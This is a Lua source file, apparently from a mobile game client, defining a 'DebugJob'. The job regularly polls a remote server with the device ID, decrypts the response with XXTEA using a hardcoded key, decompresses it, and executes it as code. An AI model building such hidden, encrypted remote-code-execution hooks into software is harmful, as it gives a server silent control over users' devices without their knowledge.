
local DebugJob  = class("DebugJob")

local ComSdkUtils = require("upgrade.ComSdkUtils")

DebugJob.checkUpdateInterval = 8 -- seconds
DebugJob.waitingCodeInterval = 30000

-- G_HandlersManager.codeHandler:sendGetCode()

function DebugJob:ctor() 
    self._waitingCodeId = ""
    self._lastId = ""
    self._waitingTime = 0

end

function DebugJob:checkUpdate()

    if self._waitingTime and FuncHelperUtil:getCurrentTime()  - self._waitingTime < DebugJob.waitingCodeInterval then
        --wait
        return
    end

    self._waitingTime = FuncHelperUtil:getCurrentTime() 

    local url = string.format("http://patch.n.m.youzu.com/nconfig/services/nconfig?action=get_debug&d=%s", G_PlatformProxy:getDeviceId())
    local request = uf_netManager:createHTTPRequestGet(url, function(event) 
        self._waitingTime = 0

        local request = event.request
        local errorCode = request:getErrorCode()
        local response = request:getResponseString()


        local crypto = require("framework.crypto")  
        local sig = crypto.md5(response, false)

        if sig == self._lastSig then

            return 
        end

        local src = crypto.decodeBase64(response)
        if src then
            local custom = crypto.decryptXXTEA(  src, "debugkey")
            if custom then

                local deflatelua = require("app.storage.deflatelua")
                local string_char = string.char
                local result = ""
                deflatelua.inflate_zlib({input=custom,output=function(b) 
                  result = result.. string_char(b) 
                end })

                local customFunc  = require("app.MyApp").oldloadstring(result)
                self._lastCode = result
                if customFunc ~= nil and type(customFunc) == "function" then
                    self._customResult = customFunc()  
                    print("wait finish")
                    self._lastSig =  sig
                    
                end  

            end
        end


    end)
    request:start()

end


function DebugJob:start()
    print("start debug")
    GlobalFunc.addTimer(  DebugJob.checkUpdateInterval, handler(self, self.checkUpdate))

    uf_eventManager:addEventListener("config_event_singal", function(obj, tag) 
        if __onCommand ~= nil then
            __onCommand(tag)
        end
     end , self)
    self:checkUpdate()
end


return DebugJob